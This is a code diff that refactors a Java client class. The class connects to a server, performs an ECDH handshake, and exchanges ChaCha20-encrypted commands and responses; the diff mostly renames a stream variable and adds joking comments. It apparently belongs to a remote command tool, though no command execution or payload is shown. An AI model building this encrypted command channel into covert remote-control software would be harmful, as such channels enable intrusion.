@@ -14,7 +14,7 @@ public class ServerConnection {
 	private final String serverIp;
 	private final int serverPort;
 	private Socket socket;
-	private DataInputStream textIn;
+	private DataInputStream dataIn;
 	private DataOutputStream dataOut;
 	private byte[] encryptionKey;
 	private static final Logger logger = Logger.getLogger(ServerConnection.class.getName());
@@ -22,10 +22,13 @@ public class ServerConnection {
 	private final byte[] privateKey;
 	private final byte[] publicKey;
 
+	/*This class does way too much fucking stuff
+	ToDo - refactor this shit */
 	public ServerConnection(String serverIp, int serverPort) {
 		this.serverIp = serverIp;
 		this.serverPort = serverPort;
 
+		//Get the keys for the handshake
 		this.privateKey = ECDHKeyExchange.generatePrivateKey();
 		this.publicKey = ECDHKeyExchange.generatePublicKey(privateKey);
 	}
@@ -34,19 +37,20 @@ public class ServerConnection {
 		try {
 			System.out.println("[-] Connecting to server...");
 			socket = new Socket();
-			socket.connect(new InetSocketAddress(serverIp, serverPort), 5000);
+			socket.connect(new InetSocketAddress(serverIp, serverPort), 5000); //I think this is a timeout thing, I forgot tbh
 			System.out.println("[-*] Connected to server: " + serverIp + ":" + serverPort);
-			textIn = new DataInputStream(socket.getInputStream());
+			dataIn = new DataInputStream(socket.getInputStream());
 			dataOut = new DataOutputStream(socket.getOutputStream());
-
+			
+			//Send the public key
 			sendPublicKey();
-			byte[] clientPublicKey = receivePublicKey();
+			byte[] serverPublicKey = receivePublicKey();
 
-			if (clientPublicKey == null || clientPublicKey.length == 0) {
+			if (serverPublicKey == null || serverPublicKey.length == 0) {
 				throw new IOException("Invalid or empty public key received.");
 			}
 
-			encryptionKey = ECDHKeyExchange.performECDHKeyExchange(privateKey, clientPublicKey);
+			encryptionKey = ECDHKeyExchange.performECDHKeyExchange(privateKey, serverPublicKey); //Do the handshake
 
 			System.out.println("[-*] Encryption key established.");
 		} catch (UnknownHostException e) {
@@ -60,24 +64,27 @@ public class ServerConnection {
 		}
 	}
 
+	//Prove yourself worthy
 	private void sendPublicKey() throws IOException {
 		dataOut.writeInt(publicKey.length);
 		dataOut.write(publicKey);
 		dataOut.flush();
 	}
 
+	//Okay...but are you worthy?
 	private byte[] receivePublicKey() throws IOException {
-		int length = textIn.readInt();
+		int length = dataIn.readInt();
 		if (length <= 0 || length > 256) {
 			throw new IOException("Invalid public key length received.");
 		}
 		byte[] publicKeyServer = new byte[length];
-		textIn.readFully(publicKeyServer);
+		dataIn.readFully(publicKeyServer);
 		return publicKeyServer;
 	}
-
+	
+	//I'm illiterate, so I make computers read for me
 	public String readCommand() throws IOException {
-		int length = textIn.readInt();
+		int length = dataIn.readInt();
 		if (length <= 12) {
 			throw new IOException("Invalid encrypted command length.");
 		}
@@ -85,8 +92,8 @@ public class ServerConnection {
 		byte[] nonce = new byte[12];
 		byte[] encryptedCommand = new byte[length - 12];
 
-		textIn.readFully(nonce);
-		textIn.readFully(encryptedCommand);
+		dataIn.readFully(nonce);
+		dataIn.readFully(encryptedCommand);
 
 		try {
 			byte[] decryptedCommand = ChaCha20.decrypt(encryptionKey, nonce, encryptedCommand);
@@ -95,7 +102,8 @@ public class ServerConnection {
 			throw new IOException("Failed to decrypt command", e);
 		}
 	}
-
+	
+	//I have social anxiety, so I make computers respond for me
 	public void sendEncryptedResponse(String response) throws IOException, Exception {
 		byte[] nonce = new byte[12];
 		new SecureRandom().nextBytes(nonce);
@@ -108,8 +116,9 @@ public class ServerConnection {
 		dataOut.flush();
 	}
 
+	//I'm lonely so I make computers recieve responses for me. Also I'm 90% sure this method isn't needed, I'll have to check later
 	public String receiveEncryptedResponse() throws IOException {
-		int length = textIn.readInt();
+		int length = dataIn.readInt();
 		if (length <= 12) {
 			throw new IOException("Invalid encrypted response length.");
 		}
@@ -117,8 +126,8 @@ public class ServerConnection {
 		byte[] nonce = new byte[12];
 		byte[] encryptedResponse = new byte[length - 12];
 
-		textIn.readFully(nonce);
-		textIn.readFully(encryptedResponse);
+		dataIn.readFully(nonce);
+		dataIn.readFully(encryptedResponse);
 
 		try {
 			byte[] decryptedResponse = ChaCha20.decrypt(encryptionKey, nonce, encryptedResponse);
@@ -127,19 +136,22 @@ public class ServerConnection {
 			throw new IOException("Failed to decrypt response", e);
 		}
 	}
-
+	
+	//Pass it on
 	public DataOutputStream getDataOut() {
 		return dataOut;
 	}
-
+	
+	//Pass it on
 	public byte[] getSessionKey() {
 		return encryptionKey;
 	}
 
+	//I think this works, if it doesn't, then if it stops with errors, it's still stopped, so win win, I guess
 	public synchronized void cleanup() {
 		try {
-			if (textIn != null) {
-				textIn.close();
+			if (dataIn != null) {
+				dataIn.close();
 			}
 			if (dataOut != null) {
 				dataOut.close();
